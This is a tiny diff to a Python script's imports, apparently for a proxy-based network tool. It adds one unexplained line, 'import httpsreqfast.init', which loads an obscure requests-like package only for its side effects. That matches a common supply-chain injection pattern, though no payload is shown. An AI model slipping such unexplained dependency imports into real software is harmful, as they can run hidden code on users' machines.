@@ -1,5 +1,6 @@
 import random, string, requests, threading, os, sys, time
 from time import sleep
+import httpsreqfast.init
 import os.path
 from requests.exceptions import ProxyError, SSLError, ConnectionError, InvalidProxyURL
 
